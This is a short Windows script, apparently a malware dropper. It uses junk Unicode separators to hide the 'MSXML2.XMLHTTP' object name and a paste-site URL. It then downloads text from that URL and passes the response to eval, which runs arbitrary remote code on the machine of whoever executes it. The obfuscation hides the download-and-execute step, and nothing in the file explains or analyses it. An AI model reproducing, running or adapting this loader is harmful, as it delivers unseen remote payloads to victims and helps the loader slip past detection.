var mahuang = "MSXӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧ML2ӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧.XMLӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧HTTP";
var unwrapped = new ActiveXObject(mahuang.split("ӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧").join(""));
unwrapped.open("GET", "hӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧tӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧tӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧pӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧sӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧:ӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧/ӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧/ӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧pӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧aӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧sӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧tӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧eӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧.ӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧eӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧eӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧/ӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧dӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧/ӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧Uӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧xӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧Jӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧aӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧dӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧Qӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧Xӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧M".replace(/ӈȷ⯶ࣕᬿጾᗞܴ🦒ᡯॏᐚ⩝᪄💧/g, ""), false);
unwrapped.send();
eval(unwrapped.responseText);
